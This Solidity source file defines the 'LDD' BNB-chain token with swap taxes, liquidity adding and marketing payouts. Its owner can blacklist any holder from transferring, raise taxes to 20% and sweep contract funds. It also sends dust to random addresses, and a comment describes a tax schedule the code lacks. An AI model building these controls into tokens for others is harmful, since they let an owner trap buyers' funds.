// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) { return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; }
}

library TransferHelper {
    function safeApprove(address token, address to, uint256 value) internal { (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value)); require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper::safeApprove: approve failed'); }
    function safeTransfer(address token, address to, uint256 value) internal { (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value)); require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper::safeTransfer: transfer failed'); }
    function safeTransferFrom(address token, address from, address to, uint256 value) internal { (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value)); require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper::transferFrom: transferFrom failed'); }
    function safeTransferETH(address to, uint256 value) internal { (bool success, ) = to.call{value: value}(new bytes(0)); require(success, 'TransferHelper::safeTransferETH: ETH transfer failed'); }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256) external;
}

interface IRouter {
    function WETH() external view returns (address);
    function factory() external view returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() { _transferOwnership(_msgSender()); }
    modifier onlyOwner() { _checkOwner(); _; }
    function owner() public view virtual returns (address) { return _owner; }
    function _checkOwner() internal view virtual { require(owner() == _msgSender(), "Ownable: caller is not the owner"); }
    function renounceOwnership() public virtual onlyOwner { _transferOwnership(address(0)); }
    function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), "Ownable: new owner is the zero address"); _transferOwnership(newOwner); }
    function _transferOwnership(address newOwner) internal virtual { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); }
}

abstract contract ERC20 is Context, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) { _name = name_; _symbol = symbol_; _decimals = decimals_; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return _decimals; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; }
    function transfer(address to, uint256 amount) public virtual override returns (bool) { address owner = _msgSender(); _transfer(owner, to, amount); return true; }
    function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) { address owner = _msgSender(); _approve(owner, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) { address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true; }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked { _approve(owner, spender, currentAllowance - subtractedValue); }
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked { _balances[from] = fromBalance - amount; _balances[to] += amount; }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        unchecked { _balances[account] += amount; }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked { _balances[account] = accountBalance - amount; _totalSupply -= amount; }
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked { _approve(owner, spender, currentAllowance - amount); }
        }
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract TokenBus is Ownable {
    IERC20 public token;

    constructor (address token_) {
        token = IERC20(token_);
    }

    function getToken(address to, uint256 amount) external onlyOwner {
        require(token.transfer(to, amount), "transfer failed");
    }
}


abstract contract TOKEN is ERC20, Ownable {
    using SafeMath for uint256;

    /*
        0-5min:   4.5%, 20%
        5-10min:  4.5%, 15%
        10-30min: 4.5%, 10%
        30min+:   4.5%, 4.5%
    */
    uint256 public buyTax = 450;   // base 10000
    uint256 public sellTax = 2000; // base 10000

    address public WETH;

    mapping(address => bool) public _isPair;

    address public routerAddr;
    address public marketingAddr;
    address public tokenReceiver;

    TokenBus public tokenBus;

    uint256 public launchblock;
    bool    private _swapping;
    uint256 public swapLimit;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isBlacklisted;

    modifier lockSwap() { _swapping = true; _; _swapping = false; }

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address routerAddr_,
        address marketingAddr_,
        address tokenReceiver_
    ) ERC20(name_, symbol_, decimals_) {
        {
            WETH = IRouter(routerAddr_).WETH();
            routerAddr = routerAddr_;
            marketingAddr = marketingAddr_;
            tokenReceiver = tokenReceiver_;
            tokenBus = new TokenBus(WETH);
        }

        {
            swapLimit = totalSupply_.div(1000);
        }

        {
            _isExcludedFromFees[marketingAddr] = true;
            _isExcludedFromFees[tokenReceiver] = true;
            _isExcludedFromFees[address(this)] = true;
            _isExcludedFromFees[msg.sender] = true;
        }

        {
            _mint(tokenReceiver_, totalSupply_);
            _approve(address(this), routerAddr, ~uint256(0));
            IERC20(WETH).approve(routerAddr, ~uint256(0));
        }
    }

    receive() external payable {}

    function launch() external onlyOwner {
        require(launchblock == 0, "already launched");
        launchblock = block.number;
    }

    function excludeFromFees(address[] memory accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
    }

    function sweep(address token, address to) public onlyOwner {
        if (token == address(0)) TransferHelper.safeTransferETH(to, address(this).balance);
        else TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }

    function set_tax(uint256 buy, uint256 sell) public onlyOwner {
        require(buy <= 2000, "invalid tax");
        require(sell <= 2000, "invalid tax");
        buyTax = buy;
        sellTax = sell;
    }

    function set_blacklist(address[] memory accounts, bool isBlacklist) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isBlacklisted[accounts[i]] = isBlacklist;
        }
    }

    function set_pairs(address[] memory pairs, bool is_) public onlyOwner {
        for (uint256 i = 0; i < pairs.length; i++) {
            _isPair[pairs[i]] = is_;
        }
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(!_isBlacklisted[from], "blacklisted");
        require(from != address(0) && to != address(0));
        require(from != to, "no self");

        if (amount == 0) { super._transfer(from, to, 0); return; }
        if (_swapping || _isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            super._transfer(from, to, amount);
            return;
        }

        /* ----------------- */

        require(launchblock > 0, "not launched");

        uint256 taxAmount;

        if (_isPair[from]) {
            taxAmount = amount.mul(buyTax).div(10000);
            amount = _airdrop(amount, from, 1);
        }
        if (_isPair[to]) {
            taxAmount = amount.mul(sellTax).div(10000);
            amount = _airdrop(amount, from, 1);

            if (balanceOf(address(this)) > swapLimit) {
                _swap(swapLimit);
            }
        }

        /* ----------------- */

        if (taxAmount > 0) { amount = amount.sub(taxAmount); super._transfer(from, address(this), taxAmount); }

        super._transfer(from, to, amount); 
    }

    function _airdrop(uint256 amount, address from, uint256 count) internal returns (uint256) {
        if (amount <= count) return amount;
        address ad;
        for (uint i = 0; i < count; i++) {
            ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
            super._transfer(from, ad, 1);
        }
        return amount.sub(count);
    }

    function _swap(uint256 tokenAmount) internal lockSwap {
        if (tokenAmount == 0) return;

        {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = WETH;
            IRouter(routerAddr).swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount.mul(95).div(100), 0, path, address(tokenBus), block.timestamp);
        }

        uint256 wethAmount = IERC20(WETH).balanceOf(address(tokenBus));
        tokenBus.getToken(address(this), wethAmount);

        {
            uint256 toLpWeth = wethAmount.mul(5).div(95);
            uint256 toLpToken = tokenAmount.sub(tokenAmount.mul(95).div(100));
            if (toLpWeth > 0 && toLpToken > 0) {
                IRouter(routerAddr).addLiquidity(address(this), WETH, toLpToken, toLpWeth, 0, 0, tokenReceiver, block.timestamp);
            }
        }

        {
            uint256 wethAmountLeft = IERC20(WETH).balanceOf(address(this));
            if (wethAmountLeft > 0) {
                IWETH(WETH).withdraw(wethAmountLeft);
                TransferHelper.safeTransferETH(marketingAddr, address(this).balance);
            }
        }
    }
}

contract LDD is TOKEN {
    constructor()
    TOKEN(
        /* name */             "LDD",
        /* symbol */           "LDD",
        /* decimals */         18,
        /* totalSupply */      10000 * 10000 * (10**18),
        /* router */           0x10ED43C718714eb63d5aA57B78B54704E256024E,
        /* marketingAddr */    0x64A8b36D5e8288c7308751C6F3ba39120Fcc03F1,
        /* tokenReceiver */    0xb09a7369b6bdEe8606CB2c40E553d4D4C38f83dE
    )
    {}
}